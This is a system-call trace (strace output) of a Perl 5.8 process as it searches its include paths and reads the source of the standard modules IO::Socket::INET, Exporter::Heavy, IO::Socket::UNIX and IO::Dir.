5779  07:10:39.137338 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.137351 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pm", {st_mode=S_IFREG|0644, st_size=6497, ...}) = 0
5779  07:10:39.137373 open("/usr/lib/perl/5.8/IO/Socket/INET.pm", O_RDONLY|O_LARGEFILE) = 6
5779  07:10:39.137388 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb7628) = -1 ENOTTY (Inappropriate ioctl for device)
5779  07:10:39.137400 _llseek(6, 0, [0], SEEK_CUR) = 0
5779  07:10:39.137417 read(6, "# IO::Socket::INET.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::INET;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\nuse Exporter;\nuse Errno;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.29\";\n\nmy $EINVAL = exists(&Errno::EINVAL) ? Errno::EINVAL() : 1;\n\nIO::Socket::INET->register_domain( AF_INET );\n\nmy %socket_type = ( tcp  => SOCK_STREAM,\n\t\t    udp  => SOCK_DGRAM,\n\t\t    icmp => SOCK_RAW\n\t\t  );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"PeerAddr\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub _sock_info {\n  my($addr,$port,$proto) = @_;\n  my $origport = $port;\n  my @proto = ();\n  my @serv = ();\n\n  $port = $1\n\tif(defined $addr && $addr =~ s,:([\\w\\(\\)/]+)$,,);\n\n  if(defined $proto  && $proto =~ /\\D/) {\n    if(@proto = getprotobyname($proto)) {\n      $proto = $proto[2] || undef;\n    }\n    else {\n      $@ = \"Bad protocol \'$proto\'\";\n      return;\n    }\n  }\n\n  if(defined $port) {\n    my $defport = ($port =~ s,\\((\\d+)\\)$,,) ? $1 : undef;\n    my $pnum = ($port =~ m,^(\\d+)$,)[0];\n\n    @serv = getservbyname($port, $proto[0] || \"\")\n\tif ($port =~ m,\\D,);\n\n    $port = $serv[2] || $defport || $pnum;\n    unless (defined $port) {\n\t$@ = \"Bad service \'$origport\'\";\n\treturn;\n    }\n\n    $proto = (getprotobyname($serv[3]))[2] || undef\n\tif @serv && !$proto;\n  }\n\n return ($addr || undef,\n\t $port || undef,\n\t $proto || undef\n\t);\n}\n\nsub _error {\n    my $sock = shift;\n    my $err = shift;\n    {\n      local($!);\n      my $title = ref($sock).\": \";\n      $@ = join(\"\", $_[0] =~ /^$title/ ? \"\" : $title, @_);\n      close($sock)\n\tif(defined fileno($sock));\n    }\n    $! = $err;\n    return undef;\n}\n\nsub _get_addr {\n    my($sock,$addr_str, $multi) = @_;\n    my @addr;\n    if ($multi && $addr_str !~ /^\\d+(?:\\.\\d+){3}$/) {\n\t(undef, undef, undef, undef, @addr) = gethostbyname($addr_str);\n    } else {\n\tmy $h = inet_aton($addr_str);\n\tpush(@addr, $h) if defined $h;\n    }\n    @addr;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($lport,$rport,$laddr,$raddr,$proto,$type);\n\n    $arg->{LocalAddr} = $arg->{LocalHost}\n\tif exists $arg->{LocalHost} && !exists $arg->{LocalAddr};\n\n    ($laddr,$lport,$proto) = _sock_info($arg->{LocalAddr},\n\t\t\t\t\t$arg->{LocalPort},\n\t\t\t\t\t$arg->{Proto})\n\t\t\tor return _error($sock, $!, $@);\n\n    $laddr = defined $laddr ? inet_aton($laddr)\n\t\t\t    : INADDR_ANY;\n\n    return _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{LocalAddr},\"\'\")\n\tunless(defined $laddr);\n\n    $arg->{PeerAddr} = $arg->{PeerHost}\n\tif exists $arg->{PeerHost} && !exists $arg->{PeerAddr};\n\n    unless(exists $arg->{Listen}) {\n\t($raddr,$rport,$proto) = _sock_info($arg->{PeerAddr},\n\t\t\t\t\t    $arg->{PeerPort},\n\t\t\t\t\t    $proto)\n\t\t\tor return _error($sock, $!, $@);\n    }\n\n    $proto ||= (getprotobyname(\'tcp\'))[2];\n\n    my $pname = (getprotobynumber($proto))[0];\n    $type = $arg->{Type} || $socket_type{lc $pname};\n\n    my @raddr = ();\n\n    if(defined $raddr) {\n\t@raddr = $sock->_get_addr($raddr, $arg->{MultiHomed});\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless @raddr;\n    }\n\n    while(1) {\n\n\t$sock->socket(AF_INET, $type, $proto) or\n\t    return _error($sock, $!, \"$!\");\n\n        if (defined $arg->{Blocking}) {\n\t    defined $sock->blocking($arg->{Blocking})\n\t\tor return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Reuse} || $arg->{ReuseAddr}) {\n\t    $sock->sockopt(SO_REUSEADDR,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{ReusePort}) {\n\t    $sock->sockopt(SO_REUSEPORT,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Broadcast}) {\n\t\t$sock->sockopt(SO_BROADCAST,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif($lport || ($laddr ne INADDR_ANY) || exists $arg->{Listen}) {\n\t    $sock->bind($lport || 0, $laddr) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif(exists $arg->{Listen}) {\n\t    $sock->listen($arg->{Listen} || 5) or\n\t\treturn _error($sock, $!, \"$!\");\n\t    last;\n\t}\n\n \t# don\'t try to connect unless we\'re given a PeerAddr\n \tlast unless e", 4096) = 4096
5779  07:10:39.137579 stat64("/etc/perl/Exporter/Heavy.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.137596 stat64("/etc/perl/Exporter/Heavy.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.137610 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.137623 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.137637 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.137650 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.137664 stat64("/usr/lib/perl5/Exporter/Heavy.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.137676 stat64("/usr/lib/perl5/Exporter/Heavy.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.137693 stat64("/usr/share/perl5/Exporter/Heavy.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.137705 stat64("/usr/share/perl5/Exporter/Heavy.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.137719 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.137743 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.137759 stat64("/usr/share/perl/5.8/Exporter/Heavy.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.137813 stat64("/usr/share/perl/5.8/Exporter/Heavy.pm", {st_mode=S_IFREG|0644, st_size=6252, ...}) = 0
5779  07:10:39.137835 open("/usr/share/perl/5.8/Exporter/Heavy.pm", O_RDONLY|O_LARGEFILE) = 8
5779  07:10:39.137851 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb7178) = -1 ENOTTY (Inappropriate ioctl for device)
5779  07:10:39.137862 _llseek(8, 0, [0], SEEK_CUR) = 0
5779  07:10:39.137894 read(8, "package Exporter::Heavy;\n\nuse strict;\nno strict \'refs\';\n\n# On one line so MakeMaker will see it.\nrequire Exporter;  our $VERSION = $Exporter::VERSION;\n$Carp::Internal{\"Exporter::Heavy\"} = 1;\n\n#\n# We go to a lot of trouble not to \'require Carp\' at file scope,\n#  because Carp requires Exporter, and something has to give.\n#\n\nsub _rebuild_cache {\n    my ($pkg, $exports, $cache) = @_;\n    s/^&// foreach @$exports;\n    @{$cache}{@$exports} = (1) x @$exports;\n    my $ok = \\@{\"${pkg}::EXPORT_OK\"};\n    if (@$ok) {\n\ts/^&// foreach @$ok;\n\t@{$cache}{@$ok} = (1) x @$ok;\n    }\n}\n\nsub heavy_export {\n\n    # First make import warnings look like they\'re coming from the \"use\".\n    local $SIG{__WARN__} = sub {\n\tmy $text = shift;\n\tif ($text =~ s/ at \\S*Exporter\\S*.pm line \\d+.*\\n//) {\n\t    require Carp;\n\t    local $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\t    Carp::carp($text);\n\t}\n\telse {\n\t    warn $text;\n\t}\n    };\n    local $SIG{__DIE__} = sub {\n\trequire Carp;\n\tlocal $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\tCarp::croak(\"$_[0]Illegal null symbol in \\@${1}::EXPORT\")\n\t    if $_[0] =~ /^Unable to create sub named \"(.*?)::\"/;\n    };\n\n    my($pkg, $callpkg, @imports) = @_;\n    my($type, $sym, $cache_is_current, $oops);\n    my($exports, $export_cache) = (\\@{\"${pkg}::EXPORT\"},\n                                   $Exporter::Cache{$pkg} ||= {});\n\n    if (@imports) {\n\tif (!%$export_cache) {\n\t    _rebuild_cache ($pkg, $exports, $export_cache);\n\t    $cache_is_current = 1;\n\t}\n\n\tif (grep m{^[/!:]}, @imports) {\n\t    my $tagsref = \\%{\"${pkg}::EXPORT_TAGS\"};\n\t    my $tagdata;\n\t    my %imports;\n\t    my($remove, $spec, @names, @allexports);\n\t    # negated first item implies starting with default set:\n\t    unshift @imports, \':DEFAULT\' if $imports[0] =~ m/^!/;\n\t    foreach $spec (@imports){\n\t\t$remove = $spec =~ s/^!//;\n\n\t\tif ($spec =~ s/^://){\n\t\t    if ($spec eq \'DEFAULT\'){\n\t\t\t@names = @$exports;\n\t\t    }\n\t\t    elsif ($tagdata = $tagsref->{$spec}) {\n\t\t\t@names = @$tagdata;\n\t\t    }\n\t\t    else {\n\t\t\twarn qq[\"$spec\" is not defined in %${pkg}::EXPORT_TAGS];\n\t\t\t++$oops;\n\t\t\tnext;\n\t\t    }\n\t\t}\n\t\telsif ($spec =~ m:^/(.*)/$:){\n\t\t    my $patn = $1;\n\t\t    @allexports = keys %$export_cache unless @allexports; # only do keys once\n\t\t    @names = grep(/$patn/, @allexports); # not anchored by default\n\t\t}\n\t\telse {\n\t\t    @names = ($spec); # is a normal symbol name\n\t\t}\n\n\t\twarn \"Import \".($remove ? \"del\":\"add\").\": @names \"\n\t\t    if $Exporter::Verbose;\n\n\t\tif ($remove) {\n\t\t   foreach $sym (@names) { delete $imports{$sym} } \n\t\t}\n\t\telse {\n\t\t    @imports{@names} = (1) x @names;\n\t\t}\n\t    }\n\t    @imports = keys %imports;\n\t}\n\n        my @carp;\n\tforeach $sym (@imports) {\n\t    if (!$export_cache->{$sym}) {\n\t\tif ($sym =~ m/^\\d/) {\n\t\t    $pkg->VERSION($sym); # inherit from UNIVERSAL\n\t\t    # If the version number was the only thing specified\n\t\t    # then we should act as if nothing was specified:\n\t\t    if (@imports == 1) {\n\t\t\t@imports = @$exports;\n\t\t\tlast;\n\t\t    }\n\t\t    # We need a way to emulate \'use Foo ()\' but still\n\t\t    # allow an easy version check: \"use Foo 1.23, \'\'\";\n\t\t    if (@imports == 2 and !$imports[1]) {\n\t\t\t@imports = ();\n\t\t\tlast;\n\t\t    }\n\t\t} elsif ($sym !~ s/^&// || !$export_cache->{$sym}) {\n\t\t    # Last chance - see if they\'ve updated EXPORT_OK since we\n\t\t    # cached it.\n\n\t\t    unless ($cache_is_current) {\n\t\t\t%$export_cache = ();\n\t\t\t_rebuild_cache ($pkg, $exports, $export_cache);\n\t\t\t$cache_is_current = 1;\n\t\t    }\n\n\t\t    if (!$export_cache->{$sym}) {\n\t\t\t# accumulate the non-exports\n\t\t\tpush @carp,\n\t\t\t  qq[\"$sym\" is not exported by the $pkg module\\n];\n\t\t\t$oops++;\n\t\t    }\n\t\t}\n\t    }\n\t}\n\tif ($oops) {\n\t    require Carp;\n\t    Carp::croak(\"@{carp}Can\'t continue after import errors\");\n\t}\n    }\n    else {\n\t@imports = @$exports;\n    }\n\n    my($fail, $fail_cache) = (\\@{\"${pkg}::EXPORT_FAIL\"},\n                              $Exporter::FailCache{$pkg} ||= {});\n\n    if (@$fail) {\n\tif (!%$fail_cache) {\n\t    # Build cache of symbols. Optimise the lookup by adding\n\t    # barewords twice... both with and without a leading &.\n\t    # (Technique could be applied to $export_cac", 4096) = 4096
5779  07:10:39.138615 read(8, "he at cost of memory)\n\t    my @expanded = map { /^\\w/ ? ($_, \'&\'.$_) : $_ } @$fail;\n\t    warn \"${pkg}::EXPORT_FAIL cached: @expanded\" if $Exporter::Verbose;\n\t    @{$fail_cache}{@expanded} = (1) x @expanded;\n\t}\n\tmy @failed;\n\tforeach $sym (@imports) { push(@failed, $sym) if $fail_cache->{$sym} }\n\tif (@failed) {\n\t    @failed = $pkg->export_fail(@failed);\n\t    foreach $sym (@failed) {\n                require Carp;\n\t\tCarp::carp(qq[\"$sym\" is not implemented by the $pkg module ],\n\t\t\t\"on this architecture\");\n\t    }\n\t    if (@failed) {\n\t\trequire Carp;\n\t\tCarp::croak(\"Can\'t continue after import errors\");\n\t    }\n\t}\n    }\n\n    warn \"Importing into $callpkg from $pkg: \",\n\t\tjoin(\", \",sort @imports) if $Exporter::Verbose;\n\n    foreach $sym (@imports) {\n\t# shortcut for the common case of no type character\n\t(*{\"${callpkg}::$sym\"} = \\&{\"${pkg}::$sym\"}, next)\n\t    unless $sym =~ s/^(\\W)//;\n\t$type = $1;\n\t*{\"${callpkg}::$sym\"} =\n\t    $type eq \'&\' ? \\&{\"${pkg}::$sym\"} :\n\t    $type eq \'$\' ? \\${\"${pkg}::$sym\"} :\n\t    $type eq \'@\' ? \\@{\"${pkg}::$sym\"} :\n\t    $type eq \'%\' ? \\%{\"${pkg}::$sym\"} :\n\t    $type eq \'*\' ?  *{\"${pkg}::$sym\"} :\n\t    do { require Carp; Carp::croak(\"Can\'t export symbol: $type$sym\") };\n    }\n}\n\nsub heavy_export_to_level\n{\n      my $pkg = shift;\n      my $level = shift;\n      (undef) = shift;\t\t\t# XXX redundant arg\n      my $callpkg = caller($level);\n      $pkg->export($callpkg, @_);\n}\n\n# Utility functions\n\nsub _push_tags {\n    my($pkg, $var, $syms) = @_;\n    my @nontag = ();\n    my $export_tags = \\%{\"${pkg}::EXPORT_TAGS\"};\n    push(@{\"${pkg}::$var\"},\n\tmap { $export_tags->{$_} ? @{$export_tags->{$_}} \n                                 : scalar(push(@nontag,$_),$_) }\n\t\t(@$syms) ? @$syms : keys %$export_tags);\n    if (@nontag and $^W) {\n\t# This may change to a die one day\n\trequire Carp;\n\tCarp::carp(join(\", \", @nontag).\" are not tags of $pkg\");\n    }\n}\n\nsub heavy_require_version {\n    my($self, $wanted) = @_;\n    my $pkg = ref $self || $self;\n    return ${pkg}->VERSION($wanted);\n}\n\nsub heavy_export_tags {\n  _push_tags((caller)[0], \"EXPORT\",    \\@_);\n}\n\nsub heavy_export_ok_tags {\n  _push_tags((caller)[0], \"EXPORT_OK\", \\@_);\n}\n\n1;\n", 4096) = 2156
5779  07:10:39.138898 brk(0x829c000)    = 0x829c000
5779  07:10:39.139156 read(8, "", 4096) = 0
5779  07:10:39.139171 close(8)          = 0
5779  07:10:39.140381 read(6, "xists($arg->{PeerAddr});\n \n        $raddr = shift @raddr;\n\n\treturn _error($sock, $EINVAL, \'Cannot determine remote port\')\n\t\tunless($rport || $type == SOCK_DGRAM || $type == SOCK_RAW);\n\n\tlast\n\t    unless($type == SOCK_STREAM || defined $raddr);\n\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless defined $raddr;\n\n#        my $timeout = ${*$sock}{\'io_socket_timeout\'};\n#        my $before = time() if $timeout;\n\n\tundef $@;\n        if ($sock->connect(pack_sockaddr_in($rport, $raddr))) {\n#            ${*$sock}{\'io_socket_timeout\'} = $timeout;\n            return $sock;\n        }\n\n\treturn _error($sock, $!, $@ || \"Timeout\")\n\t    unless @raddr;\n\n#\tif ($timeout) {\n#\t    my $new_timeout = $timeout - (time() - $before);\n#\t    return _error($sock,\n#                         (exists(&Errno::ETIMEDOUT) ? Errno::ETIMEDOUT() : $EINVAL),\n#                         \"Timeout\") if $new_timeout <= 0;\n#\t    ${*$sock}{\'io_socket_timeout\'} = $new_timeout;\n#        }\n\n    }\n\n    $sock;\n}\n\nsub connect {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->connect(NAME) or $sock->connect(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::connect(@_ == 1 ? shift : pack_sockaddr_in(@_));\n}\n\nsub bind {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->bind(NAME) or $sock->bind(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::bind(@_ == 1 ? shift : pack_sockaddr_in(@_))\n}\n\nsub sockaddr {\n    @_ == 1 or croak \'usage: $sock->sockaddr()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub sockport {\n    @_ == 1 or croak \'usage: $sock->sockport()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub sockhost {\n    @_ == 1 or croak \'usage: $sock->sockhost()\';\n    my($sock) = @_;\n    my $addr = $sock->sockaddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\nsub peeraddr {\n    @_ == 1 or croak \'usage: $sock->peeraddr()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub peerport {\n    @_ == 1 or croak \'usage: $sock->peerport()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub peerhost {\n    @_ == 1 or croak \'usage: $sock->peerhost()\';\n    my($sock) = @_;\n    my $addr = $sock->peeraddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\n1;\n\n__END__\n\n", 4096) = 2401
5779  07:10:39.140860 _llseek(6, 6496, [6496], SEEK_SET) = 0
5779  07:10:39.140895 _llseek(6, 0, [6496], SEEK_CUR) = 0
5779  07:10:39.140905 close(6)          = 0
5779  07:10:39.140965 stat64("/etc/perl/IO/Socket/UNIX.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.140981 stat64("/etc/perl/IO/Socket/UNIX.pm", 0xbfbb781c) = -1 ENOENT (No such file or directory)
5779  07:10:39.140995 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.141008 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pm", 0xbfbb781c) = -1 ENOENT (No such file or directory)
5779  07:10:39.141022 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.141035 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pm", 0xbfbb781c) = -1 ENOENT (No such file or directory)
5779  07:10:39.141049 stat64("/usr/lib/perl5/IO/Socket/UNIX.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.141061 stat64("/usr/lib/perl5/IO/Socket/UNIX.pm", 0xbfbb781c) = -1 ENOENT (No such file or directory)
5779  07:10:39.141075 stat64("/usr/share/perl5/IO/Socket/UNIX.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.141087 stat64("/usr/share/perl5/IO/Socket/UNIX.pm", 0xbfbb781c) = -1 ENOENT (No such file or directory)
5779  07:10:39.141101 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.141114 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", {st_mode=S_IFREG|0644, st_size=1387, ...}) = 0
5779  07:10:39.141139 open("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", O_RDONLY|O_LARGEFILE) = 6
5779  07:10:39.141154 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb7628) = -1 ENOTTY (Inappropriate ioctl for device)
5779  07:10:39.141166 _llseek(6, 0, [0], SEEK_CUR) = 0
5779  07:10:39.141181 brk(0x82bd000)    = 0x82bd000
5779  07:10:39.141197 read(6, "# IO::Socket::UNIX.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::UNIX;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.22\";\n$VERSION = eval $VERSION;\n\nIO::Socket::UNIX->register_domain( AF_UNIX );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"Peer\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($bport,$cport);\n\n    my $type = $arg->{Type} || SOCK_STREAM;\n\n    $sock->socket(AF_UNIX, $type, 0) or\n\treturn undef;\n\n    if(exists $arg->{Local}) {\n\tmy $addr = sockaddr_un($arg->{Local});\n\t$sock->bind($addr) or\n\t    return undef;\n    }\n    if(exists $arg->{Listen} && $type != SOCK_DGRAM) {\n\t$sock->listen($arg->{Listen} || 5) or\n\t    return undef;\n    }\n    elsif(exists $arg->{Peer}) {\n\tmy $addr = sockaddr_un($arg->{Peer});\n\t$sock->connect($addr) or\n\t    return undef;\n    }\n\n    $sock;\n}\n\nsub hostpath {\n    @_ == 1 or croak \'usage: $sock->hostpath()\';\n    my $n = $_[0]->sockname || return undef;\n    (sockaddr_un($n))[0];\n}\n\nsub peerpath {\n    @_ == 1 or croak \'usage: $sock->peerpath()\';\n    my $n = $_[0]->peername || return undef;\n    (sockaddr_un($n))[0];\n}\n\n1; # Keep require happy\n\n__END__\n\n", 4096) = 1387
5779  07:10:39.142143 _llseek(6, 1386, [1386], SEEK_SET) = 0
5779  07:10:39.142160 _llseek(6, 0, [1386], SEEK_CUR) = 0
5779  07:10:39.142171 close(6)          = 0
5779  07:10:39.142224 stat64("/etc/perl/IO/Dir.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.142240 stat64("/etc/perl/IO/Dir.pm", 0xbfbb781c) = -1 ENOENT (No such file or directory)
5779  07:10:39.142254 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.142267 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pm", 0xbfbb781c) = -1 ENOENT (No such file or directory)
5779  07:10:39.142280 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.142307 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pm", 0xbfbb781c) = -1 ENOENT (No such file or directory)
5779  07:10:39.142366 stat64("/usr/lib/perl5/IO/Dir.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.142379 stat64("/usr/lib/perl5/IO/Dir.pm", 0xbfbb781c) = -1 ENOENT (No such file or directory)
5779  07:10:39.142392 stat64("/usr/share/perl5/IO/Dir.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.142405 stat64("/usr/share/perl5/IO/Dir.pm", 0xbfbb781c) = -1 ENOENT (No such file or directory)
5779  07:10:39.142419 stat64("/usr/lib/perl/5.8/IO/Dir.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.142445 stat64("/usr/lib/perl/5.8/IO/Dir.pm", {st_mode=S_IFREG|0644, st_size=5318, ...}) = 0
5779  07:10:39.142466 open("/usr/lib/perl/5.8/IO/Dir.pm", O_RDONLY|O_LARGEFILE) = 6
5779  07:10:39.142480 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb7628) = -1 ENOTTY (Inappropriate ioctl for device)
5779  07:10:39.142492 _llseek(6, 0, [0], SEEK_CUR) = 0
5779  07:10:39.142511 read(6, "# IO::Dir.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Dir;\n\nuse 5.006;\n\nuse strict;\nuse Carp;\nuse Symbol;\nuse Exporter;\nuse IO::File;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Tie::Hash;\nuse File::stat;\nuse File::Spec;\n\n@ISA = qw(Tie::Hash Exporter);\n$VERSION = \"1.05\";\n$VERSION = eval $VERSION;\n@EXPORT_OK = qw(DIR_UNLINK);\n\nsub DIR_UNLINK () { 1 }\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new IO::Dir [DIRNAME]\';\n    my $class = shift;\n    my $dh = gensym;\n    if (@_) {\n\tIO::Dir::open($dh, $_[0])\n\t    or return undef;\n    }\n    bless $dh, $class;\n}\n\nsub DESTROY {\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub open {\n    @_ == 2 or croak \'usage: $dh->open(DIRNAME)\';\n    my ($dh, $dirname) = @_;\n    return undef\n\tunless opendir($dh, $dirname);\n    # a dir name should always have a \":\" in it; assume dirname is\n    # in current directory\n    $dirname = \':\' .  $dirname if ( ($^O eq \'MacOS\') && ($dirname !~ /:/) );\n    ${*$dh}{io_dir_path} = $dirname;\n    1;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $dh->close()\';\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub read {\n    @_ == 1 or croak \'usage: $dh->read()\';\n    my ($dh) = @_;\n    readdir($dh);\n}\n\nsub seek {\n    @_ == 2 or croak \'usage: $dh->seek(POS)\';\n    my ($dh,$pos) = @_;\n    seekdir($dh,$pos);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $dh->tell()\';\n    my ($dh) = @_;\n    telldir($dh);\n}\n\nsub rewind {\n    @_ == 1 or croak \'usage: $dh->rewind()\';\n    my ($dh) = @_;\n    rewinddir($dh);\n}\n\nsub TIEHASH {\n    my($class,$dir,$options) = @_;\n\n    my $dh = $class->new($dir)\n\tor return undef;\n\n    $options ||= 0;\n\n    ${*$dh}{io_dir_unlink} = $options & DIR_UNLINK;\n    $dh;\n}\n\nsub FIRSTKEY {\n    my($dh) = @_;\n    $dh->rewind;\n    scalar $dh->read;\n}\n\nsub NEXTKEY {\n    my($dh) = @_;\n    scalar $dh->read;\n}\n\nsub EXISTS {\n    my($dh,$key) = @_;\n    -e File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n}\n\nsub FETCH {\n    my($dh,$key) = @_;\n    &lstat(File::Spec->catfile(${*$dh}{io_dir_path}, $key));\n}\n\nsub STORE {\n    my($dh,$key,$data) = @_;\n    my($atime,$mtime) = ref($data) ? @$data : ($data,$data);\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n    unless(-e $file) {\n\tmy $io = IO::File->new($file,O_CREAT | O_RDWR);\n\t$io->close if $io;\n    }\n    utime($atime,$mtime, $file);\n}\n\nsub DELETE {\n    my($dh,$key) = @_;\n\n    # Only unlink if unlink-ing is enabled\n    return 0\n\tunless ${*$dh}{io_dir_unlink};\n\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n\n    -d $file\n\t? rmdir($file)\n\t: unlink($file);\n}\n\n1;\n\n__END__\n\n=head1 NAME \n\nIO::Dir - supply object methods for directory handles\n\n=head1 SYNOPSIS\n\n    use IO::Dir;\n    $d = IO::Dir->new(\".\");\n    if (defined $d) {\n        while (defined($_ = $d->read)) { something($_); }\n        $d->rewind;\n        while (defined($_ = $d->read)) { something_else($_); }\n        undef $d;\n    }\n\n    tie %dir, \'IO::Dir\', \".\";\n    foreach (keys %dir) {\n\tprint $_, \" \" , $dir{$_}->size,\"\\n\";\n    }\n\n=head1 DESCRIPTION\n\nThe C<IO::Dir> package provides two interfaces to perl\'s directory reading\nroutines.\n\nThe first interface is an object approach. C<IO::Dir> provides an object\nconstructor and methods, which are just wrappers around perl\'s built in\ndirectory reading routines.\n\n=over 4\n\n=item new ( [ DIRNAME ] )\n\nC<new> is the constructor for C<IO::Dir> objects. It accepts one optional\nargument which,  if given, C<new> will pass to C<open>\n\n=back\n\nThe following methods are wrappers for the directory related functions built\ninto perl (the trailing `dir\' has been removed from the names). See L<perlfunc>\nfor details of these functions.\n\n=over 4\n\n=item open ( DIRNAME )\n\n=item read ()\n\n=item seek ( POS )\n\n=item tell ()\n\n=item rewind ()\n\n=item close ()\n\n=back\n\nC<IO::Dir> also provides an interface to reading directories via a tied\nhash. The tied hash extends the interface beyond just the directory\nreading routines by the use of C<lstat>, from the C<File::stat> package,\nC<unlin", 4096) = 4096
